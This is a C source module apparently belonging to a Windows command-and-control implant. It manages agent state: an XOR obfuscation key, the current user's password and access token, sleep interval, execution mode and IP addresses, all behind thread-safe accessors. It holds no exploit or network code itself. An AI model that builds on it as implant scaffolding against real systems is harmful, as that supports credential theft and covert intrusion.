/*
*******************************************************************************************
* Module: whisper_heapconfig.c
*
* Description:
*   This module implements a modular, expandable data storage system for an agent application.
*   The primary container is the HeapStore struct, which aggregates pointers to various subsystem
*   structures that hold configuration and runtime state for the agent.
*
* Structures:
*   HeapStore:
*        ONE heap store should exist per execution. This is immediatlet set up in main
*
*     - tokenStore:         Pointer to the token subsystem (reserved for future use).
*     - configStore:        Pointer to the configuration subsystem (reserved for future use).
*     - securityStore:      Pointer to SecurityStoreStruct, which holds security-related data (e.g., xor_key).
*     - currentUserStore:   Pointer to CurrentUserStoreStruct, which holds current user information.
*     - agentStore:         Pointer to AgentStoreStruct, which contains agent-specific data (e.g., agent_id).
*     - agentBehaviorStore: Pointer to AgentBehaviorStruct, which holds runtime behavior settings such as
*                           execution mode and sleep time, and includes a synchronization lock.
*
*   SecurityStoreStruct:
*     - xor_key: A hardcoded XOR key used for simple security operations or obfuscation.
*
*   CurrentUserStoreStruct:
*     - username:               Pointer to a string containing the current user's name.
*     - password:               Pointer to a string containing the current user's password.
*     - domain:                 Pointer to a string containing the current user's domain.
*     - userSid:                Pointer to the current user's security identifier (SID).
*     - token:                  Handle to the current user's access token.
*     - logonId:                Locally unique identifier (LUID) for the user's logon session.
*     - sessionId:              Identifier for the user's session (DWORD).
*     - profilePath:            Pointer to a wide-character string (LPWSTR) containing the path to
*                               the user's profile.
*
*
*   AgentStoreStruct:
*     - agent_id: A character array (typically storing a unique identifier such as a UUID) for the agent.
*
*   AgentBehaviorStruct:
*     - sleep_time:         The delay (in seconds) between agent execution cycles.
*     - execution_mode:     Indicates the agent's operating mode (e.g., synchronous or asynchronous).
*     - agent_config_lock:  An SRWLock used to protect access to configuration and runtime settings.
*
* Connections:
*   The HeapStore struct is the central repository that aggregates all subsystem structures.
*   Each subsystem is dynamically allocated and linked within HeapStore via its pointers.
*   The getters and setters operate on the agentBehaviorStore to ensure thread-safe modification and
*   retrieval of runtime configuration values.
*
* Function Information:
*
*   int initStructs(HeapStore *heapStore)
*     - Initializes all subsystem pointers in the HeapStore structure.
*     - Dynamically allocates memory for SecurityStoreStruct, CurrentUserStoreStruct, AgentStoreStruct, and
*       AgentBehaviorStruct.
*     - Sets initial values, such as the XOR key for the security store and default values for the
*       agent behavior (sleep time, execution mode, etc.).
*     - Returns 0 on success or -1 if any memory allocation fails.
*
*   void deinitStructs(HeapStore *heapStore)
*     - Deallocates all memory allocated for subsystem structures within HeapStore.
*     - Resets pointers to NULL to prevent dangling references.
*
*   void set_execution_mode(ExecutionMode mode, HeapStore *heapStorePointer)
*     - Sets the agent's execution mode (e.g., synchronous/asynchronous) in a thread-safe manner.
*     - Uses an SRWLock to ensure exclusive access during modification.
*
*   ExecutionMode get_execution_mode(HeapStore *heapStorePointer)
*     - Retrieves the current agent execution mode in a thread-safe manner.
*     - Uses an SRWLock to ensure safe access to the configuration.
*
*   void set_sleep_time(DWORD new_time, HeapStore *heapStorePointer)
*     - Updates the sleep time value in the agent behavior configuration in a thread-safe manner.
*
*   DWORD get_sleep_time(HeapStore *heapStorePointer)
*     - Retrieves the current sleep time value from the agent behavior configuration in a thread-safe manner.
*
* Goal:
*   To provide a clear, modular, and expandable system for managing an agent's various subsystems,
*   enabling easy development and maintenance while ensuring proper synchronization and memory management.
*******************************************************************************************
*/

#include "whisper_structs.h" //contains the func prototypes for in here
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "whisper_config.h"

/* put in structs or soemthign .c*/
// Initialize structures and assign values to their members
int initStructs(HeapStore *heapStore)
{
    // Notes:
    // Using calloc to have predictable 0'd out memory

    // Initialize pointers to NULL to ensure safe cleanup later + clear data
    // may not need to do calloc switch, instead of malloc
    heapStore->tokenStore = NULL;
    heapStore->configStore = NULL;
    heapStore->securityStore = NULL;
    heapStore->currentUserStore = NULL;
    heapStore->agentNetworkStore = NULL;
    heapStore->agentBehaviorStore = NULL;

    // -----------------------------------------
    // SecurityStoreStruct
    // -----------------------------------------
    SecurityStoreStruct *secstruct = calloc(1, sizeof(SecurityStoreStruct));
    if (secstruct == NULL)
    {
        fprintf(stderr, "Memory allocation failed for SecurityStoreStruct\n");
        return -1;
    }
    secstruct->xor_key = 0x01; // Hardcoded value (can be a macro)

    // -----------------------------------------
    // CurrentUserStoreStruct
    // -----------------------------------------
    CurrentUserStoreStruct *curruserstruct = calloc(1, sizeof(CurrentUserStoreStruct));
    if (curruserstruct == NULL)
    {
        fprintf(stderr, "Memory allocation failed for CurrentUserStoreStruct\n");
        return -1;
    }

    // -----------------------------------------
    // AgentStoreStruct
    // -----------------------------------------
    AgentStoreStruct *agentstruct = calloc(1, sizeof(AgentStoreStruct));
    if (agentstruct == NULL)
    {
        fprintf(stderr, "Memory allocation failed for AgentStoreStruct\n");
        return -1;
    }

    // -----------------------------------------
    // AgentNetworkStruct
    // -----------------------------------------
    AgentNetworkStruct *networkstruct = calloc(1, sizeof(AgentNetworkStruct));
    if (networkstruct == NULL)
    {
        fprintf(stderr, "Memory allocation failed for AgentNetworkStruct\n");
        return -1;
    }

    // -----------------------------------------
    // AgentBehaviorStruct
    // -----------------------------------------
    AgentBehaviorStruct *agentbehaviorstruct = calloc(1, sizeof(AgentBehaviorStruct));
    if (agentbehaviorstruct == NULL)
    {
        fprintf(stderr, "Memory allocation failed for AgentBehaviorStruct\n");
        return -1;
    }
    agentbehaviorstruct->sleep_time = 60;
    agentbehaviorstruct->execution_mode = EXEC_MODE_ASYNC;
    InitializeSRWLock(&agentbehaviorstruct->agent_config_lock);

    // Assign the filled structure to the HeapStore
    heapStore->securityStore = secstruct;
    heapStore->currentUserStore = curruserstruct;
    heapStore->agentStore = agentstruct;
    heapStore->agentBehaviorStore = agentbehaviorstruct;
    heapStore->agentNetworkStore = networkstruct;
    return 0;
}

// Deinitialize structures and free allocated memory
void deinitStructs(HeapStore *heapStore)
{
    if (heapStore == NULL)
        return;

    // Free securityStore if allocated
    if (heapStore->securityStore != NULL)
    {
        free(heapStore->securityStore);
        heapStore->securityStore = NULL;
    }

    if (heapStore->agentBehaviorStore != NULL)
    {
        free(heapStore->agentBehaviorStore);
        heapStore->agentBehaviorStore = NULL;
    }

    // Free securityStore if allocated
    if (heapStore->agentStore != NULL)
    {
        free(heapStore->agentStore);
        heapStore->agentStore = NULL;
    }

    // Free tokenStore if allocated (for future use)
    if (heapStore->currentUserStore != NULL)
    {
        free(heapStore->currentUserStore);
        heapStore->currentUserStore = NULL;
    }

    // Free tokenStore if allocated (for future use)
    if (heapStore->tokenStore != NULL)
    {
        free(heapStore->tokenStore);
        heapStore->tokenStore = NULL;
    }

    // Free configStore if allocated (for future use)
    if (heapStore->configStore != NULL)
    {
        free(heapStore->configStore);
        heapStore->configStore = NULL;
    }
}
/* [end] put in structs or soemthign .c*/

// -----------------------------------------
// Setter/Getter setup/Info
// -----------------------------------------
/**
 *
 * This module provides thread-safe getter and setter functions for managing the
 * HeapStore data structure. Getters acquire an SRWLock before accessing data
 * to ensure safe concurrent reads, while setters acquire an SRWLock to update data.
 *
 * For string-valued fields, the setter functions duplicate (copy) the input data
 * using strdup and free any previously allocated memory before assigning the new copy.
 * This ensures that the HeapStore owns its own copy of the data, preventing external
 * modifications and reducing the risk of memory leaks or dangling pointers.
 *
 * The locking mechanism used is the Windows SRWLock, which guarantees exclusive access
 * during modifications and maintains consistency during concurrent accesses.
 */

// -----------------------------------------
// Current User funcs
// -----------------------------------------
/**
 * @brief Retrieves the current stored token.
 *
 * Acquires an exclusive lock on the token before accessing it.
 * If no token is stored, attempts to get the current process token as fallback.
 *
 * @param heapStorePointer Pointer to the HeapStore structure.
 * @return HANDLE to the current token, or the current process token if no token is stored.
 */
HANDLE get_current_stored_token(HeapStore *heapStorePointer)
{
    // Acquire the lock before accessing the token
    AcquireSRWLockExclusive(&heapStorePointer->agentBehaviorStore->agent_config_lock);
    DEBUG_LOG("GET TOKEN");

    HANDLE token = heapStorePointer->currentUserStore->token;

    if (!token)
    {
        // Release the lock before retrieving the process token.
        ReleaseSRWLockExclusive(&heapStorePointer->agentBehaviorStore->agent_config_lock);

        // If no token is stored, retrieve and return the current process token.
        // is just a fallback incase a toekn doesn't exist or something
        token = GetCurrentProcessToken();
        if (!token)
        {
            DEBUG_LOG("Failed to retrieve current process token.\n");
        }
        return token;
    }

    // Release the lock before returning the stored token.
    ReleaseSRWLockExclusive(&heapStorePointer->agentBehaviorStore->agent_config_lock);
    return token;
}

/**
 * @brief Sets the current stored token.
 *
 * Acquires an exclusive lock on the token before assigning the new token.
 *
 * @param heapStorePointer Pointer to the HeapStore structure.
 * @param hToken The HANDLE to be stored.
 */
void set_current_stored_token(HeapStore *heapStorePointer, HANDLE hToken)
{
    AcquireSRWLockExclusive(&heapStorePointer->agentBehaviorStore->agent_config_lock);
    // For HANDLE, direct assignment is acceptable.
    heapStorePointer->currentUserStore->token = hToken;
    ReleaseSRWLockExclusive(&heapStorePointer->agentBehaviorStore->agent_config_lock);
}

/**
 * @brief Sets the current username.
 *
 * Makes a copy of the provided username and frees any previously stored username.
 * Uses an exclusive lock on the username field for thread-safe access.
 *
 * @param heapStorePointer Pointer to the HeapStore structure.
 * @param username The new username string.
 */
void set_current_username(HeapStore *heapStorePointer, char *username)
{
    if (username == NULL)
    {
        DEBUG_LOG("Received NULL username; skipping update.\n");
        return;
    }
    // Duplicate the username string
    char *username_copy = strdup(username);
    if (username_copy == NULL)
    {
        // Handle allocation failure if needed
        DEBUG_LOG("Failed to allocate memory for username copy.\n");
        return;
    }

    AcquireSRWLockExclusive(&heapStorePointer->agentBehaviorStore->agent_config_lock);
    // Free previous username if it exists
    if (heapStorePointer->currentUserStore->username != NULL)
    {
        free(heapStorePointer->currentUserStore->username);
    }
    heapStorePointer->currentUserStore->username = username_copy;
    ReleaseSRWLockExclusive(&heapStorePointer->agentBehaviorStore->agent_config_lock);
}
/**
 * @brief Retrieves a dynamically allocated copy of the current username.
 *
 * This function acquires a shared (read) lock on the agentBehaviorStore's configuration lock to
 * safely access the username stored in the currentUserStore. It duplicates the username using strdup,
 * allowing the caller to own a separate copy. The caller is responsible for freeing the returned memory.
 *
 * @param heapStorePointer Pointer to the HeapStore containing the current user data.
 * @return A pointer to a newly allocated copy of the current username, or NULL if the username is not set
 *         or the heapStorePointer is invalid.
 */
char *get_current_username(HeapStore *heapStorePointer)
{
    if (heapStorePointer == NULL || heapStorePointer->currentUserStore == NULL)
    {
        return NULL;
    }

    // Use a shared lock since this is a read-only operation.
    AcquireSRWLockShared(&heapStorePointer->agentBehaviorStore->agent_config_lock);

    char *username_copy = NULL;
    if (heapStorePointer->currentUserStore->username != NULL)
    {
        username_copy = strdup(heapStorePointer->currentUserStore->username);
    }

    // Release the shared lock.
    ReleaseSRWLockShared(&heapStorePointer->agentBehaviorStore->agent_config_lock);
    return username_copy;
}

// -----------------------------------------
// AgentBehaviorFuncs
// -----------------------------------------

/**
 * @brief Sets the agent's execution mode.
 *
 * Acquires an exclusive lock on the agent configuration lock before updating the execution mode.
 *
 * @param mode The new execution mode.
 * @param heapStorePointer Pointer to the HeapStore structure.
 */
void set_execution_mode(ExecutionMode mode, HeapStore *heapStorePointer)
{
    DEBUG_LOG("B4 ECS");

    AcquireSRWLockExclusive(&heapStorePointer->agentBehaviorStore->agent_config_lock);
    DEBUG_LOG("SET CONFIG");

    heapStorePointer->agentBehaviorStore->execution_mode = mode;
    ReleaseSRWLockExclusive(&heapStorePointer->agentBehaviorStore->agent_config_lock);
    DEBUG_LOG("LEAVE ECS");
}

/**
 * @brief Retrieves the current execution mode.
 *
 * Acquires an exclusive lock on the agent configuration before reading the execution mode.
 *
 * @param heapStorePointer Pointer to the HeapStore structure.
 * @return The current ExecutionMode.
 */
ExecutionMode get_execution_mode(HeapStore *heapStorePointer)
{
    AcquireSRWLockExclusive(&heapStorePointer->agentBehaviorStore->agent_config_lock);
    ExecutionMode mode = heapStorePointer->agentBehaviorStore->execution_mode; // Copy the value
    ReleaseSRWLockExclusive(&heapStorePointer->agentBehaviorStore->agent_config_lock);
    return mode;
}

/**
 * @brief Sets the sleep time for the agent behavior.
 *
 * Acquires an exclusive lock on the agent configuration before updating the sleep time.
 *
 * @param new_time The new sleep time in seconds.
 * @param heapStorePointer Pointer to the HeapStore structure.
 */
void set_sleep_time(DWORD new_time, HeapStore *heapStorePointer)
{
    AcquireSRWLockExclusive(&heapStorePointer->agentBehaviorStore->agent_config_lock);
    heapStorePointer->agentBehaviorStore->sleep_time = new_time;
    ReleaseSRWLockExclusive(&heapStorePointer->agentBehaviorStore->agent_config_lock);
}

/**
 * @brief Retrieves the sleep time from the agent behavior configuration.
 *
 * Acquires an exclusive lock on the agent configuration before retrieving the sleep time.
 *
 * @param heapStorePointer Pointer to the HeapStore structure.
 * @return The current sleep time in seconds.
 */
DWORD get_sleep_time(HeapStore *heapStorePointer)
{
    AcquireSRWLockExclusive(&heapStorePointer->agentBehaviorStore->agent_config_lock);
    DWORD sleep_time = heapStorePointer->agentBehaviorStore->sleep_time;
    ReleaseSRWLockExclusive(&heapStorePointer->agentBehaviorStore->agent_config_lock);
    return sleep_time;
}

// -----------------------------------------
// AgentNetworkStruct
// -----------------------------------------
/**
 * @brief Sets the external IP address.
 *
 * Duplicates the provided external IP address string and frees any previous value.
 * Uses an exclusive lock on the ext_ip field for thread-safe access.
 *
 * @param heapStorePointer Pointer to the HeapStore structure.
 * @param ext_ip The external IP address string.
 */
void set_external_ip(HeapStore *heapStorePointer, char *ext_ip)
{
    char *ext_ip_copy = strdup(ext_ip);
    if (ext_ip_copy == NULL)
    {
        DEBUG_LOG("Failed to allocate memory for external IP copy.\n");
        return;
    }

    AcquireSRWLockExclusive(&heapStorePointer->agentBehaviorStore->agent_config_lock);
    if (heapStorePointer->agentNetworkStore->ext_ip != NULL)
    {
        free(heapStorePointer->agentNetworkStore->ext_ip);
    }
    heapStorePointer->agentNetworkStore->ext_ip = ext_ip_copy;
    ReleaseSRWLockExclusive(&heapStorePointer->agentBehaviorStore->agent_config_lock);
}

/**
 * @brief Sets the internal IP address.
 *
 * Duplicates the provided internal IP address string and frees any previous value.
 * Uses an exclusive lock on the int_ip field for thread-safe access.
 *
 * @param heapStorePointer Pointer to the HeapStore structure.
 * @param int_ip The internal IP address string.
 */
void set_internal_ip(HeapStore *heapStorePointer, char *int_ip)
{
    char *int_ip_copy = strdup(int_ip);
    if (int_ip_copy == NULL)
    {
        DEBUG_LOG("Failed to allocate memory for internal IP copy.\n");
        return;
    }

    AcquireSRWLockExclusive(&heapStorePointer->agentBehaviorStore->agent_config_lock);
    if (heapStorePointer->agentNetworkStore->int_ip != NULL)
    {
        free(heapStorePointer->agentNetworkStore->int_ip);
    }
    heapStorePointer->agentNetworkStore->int_ip = int_ip_copy;
    ReleaseSRWLockExclusive(&heapStorePointer->agentBehaviorStore->agent_config_lock);
}